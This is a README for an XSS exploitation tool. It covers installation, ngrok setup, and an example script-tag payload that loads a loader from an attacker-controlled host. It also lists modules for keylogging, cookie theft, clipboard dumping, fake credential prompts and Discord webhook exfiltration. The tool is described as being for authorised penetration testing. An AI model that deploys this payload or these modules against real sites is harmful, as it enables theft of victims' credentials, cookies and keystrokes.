# XSS BABE

XSS Babe is a tool for exploiting XSS vulnerabilities in real time. 
It automates delivery, tracking, and payload interaction through a live command-line interface. 


## ⚠️ Legal Disclaimer

This tool is for educational and ethical penetration testing only. 
Do not use it against targets without permission. 
You are solely responsible for how you use this software.

---

## Installation

### 1. Clone the Repo

```bash
git clone https://github.com/ekomsSavior/XSS-BABE.git
cd XSS-BABE
```

### 2. Install Dependencies

```bash
sudo apt update
sudo apt install python3 unzip -y
sudo apt install python3-flask python3-pyngrok -y
```

### 3. Install Ngrok

```bash
wget https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-stable-linux-amd64.zip
unzip ngrok-stable-linux-amd64.zip
sudo mv ngrok /usr/local/bin/
```

---

## Ngrok Setup

1. Sign up at https://ngrok.com/signup  
2. Copy your auth token from: https://dashboard.ngrok.com/get-started/setup  
3. Add your token:

```bash
ngrok config add-authtoken YOUR_TOKEN_HERE
```

---

## Usage

```bash
python3 xss_babe_cli.py
```

### What It Does:
- Prompts for a target XSS URL (like: `https://vuln.site/?q=`)
- Auto-launches the Flask server and Ngrok
- Injects `x.js` loader into your payload
- Displays a live menu of attack modules
- Logs all browser events and saves session results in `session_reports/`

---

## Example Payload

Use the Ngrok URL + this payload in the vulnerable input:

```html
<script src="https://YOUR_NGROK_URL/static/x.js"></script>
```

---

## Modules List

| Module                   | Description                                              | Status        |
|--------------------------|----------------------------------------------------------|--------------|
| `keylogger`              | Records keystrokes in real time                          |  Live        |
| `fake_login`             | Displays fake login form for credential capture          |  Coming Soon |
| `clipboard`              | Dumps contents of the victim’s clipboard                 |  Live        |
| `auto_cookie_steal`      | Extracts document cookies silently                       |  Live        |
| `browser_history`        | Reads browser history if accessible                      |  Coming Soon |
| `fake_download`          | Prompts a fake download and logs the click               |  Live        |
| `fingerprint`            | Collects user-agent, screen size, timezone               |  Coming Soon |
| `screenshot`             | Captures a visual screenshot using HTML2Canvas           |  Coming Soon |
| `recon`                  | Loads iframe ports and resources for open recon          |  Coming Soon |
| `cross_tab_spy`          | Detects and tracks multiple open tabs                    |  Coming Soon |
| `cross_tab_messaging_spy`| Reports other open tabs and focus changes                |  Live        |
| `discord_logger`         | Sends a page load alert to a Discord webhook             |  Live        |
| `password_bait`          | Displays a fake password prompt to capture credentials   |  Live        |

---

## File Structure

- `xss_babe/`
  - `xss_babe_cli.py` – Main interactive CLI
  - `server.py` – Flask server for payload delivery
  - `requirements.txt` – Python dependencies
  - `static/`
    - `x.js` – XSS loader script
    - `modules/`
      - `auto_cookie_steal.js`
      - `clipboard.js`
      - `cross_tab_messaging_spy.js`
      - `discord_logger.js`
      - `fake_download.js`
      - `history_stealer.js`
      - `keylogger.js`
      - `password_bait.js`
      - `fake_login.js` *(coming soon)*
      - `browser_history.js` *(coming soon)*
      - `fingerprint.js` *(coming soon)*
      - `screenshot.js` *(coming soon)*
      - `recon.js` *(coming soon)*
      - `cross_tab_spy.js` *(coming soon)*
  - `utils/`
    - `save_to_txt.py` – Helper to save session info
  - `session_reports/`
    - `[timestamp].txt` – Auto-generated session logs

---

## Logs and Reporting

All session output (payloads used, timestamps, logs) are saved to:

```
session_reports/YYYY-MM-DD-HHMMSS.txt
```

---

## Stay Ethical

Use XSS Babe only in lab environments or on targets you own or have permission to test. 

---

##  Developed by [ekomsSavior](https://github.com/ekomsSavior)
